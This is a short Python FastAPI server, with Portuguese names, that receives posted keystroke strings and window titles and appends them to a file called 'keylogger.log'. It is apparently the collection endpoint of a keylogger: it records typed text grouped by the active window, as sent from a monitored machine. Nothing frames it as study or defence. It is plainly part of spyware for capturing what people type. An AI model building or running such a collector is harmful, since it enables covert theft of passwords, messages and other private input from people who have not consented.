from fastapi import FastAPI
from pydantic import BaseModel


app = FastAPI()

class DadosEntrada(BaseModel):
    string1: str
    string2: str

window_base = ""

@app.post("/")
def processar_dados(dados: DadosEntrada):
    global window_base

    if dados.string2 == window_base:
        pass
    else:
        window_base = dados.string2
        with open('keylogger.log', 'a') as logger:
            logger.write(f"\n[JANELA] {dados.string2}\n")

    with open('keylogger.log', 'a') as logger:
        logger.write(f"{dados.string1} ")
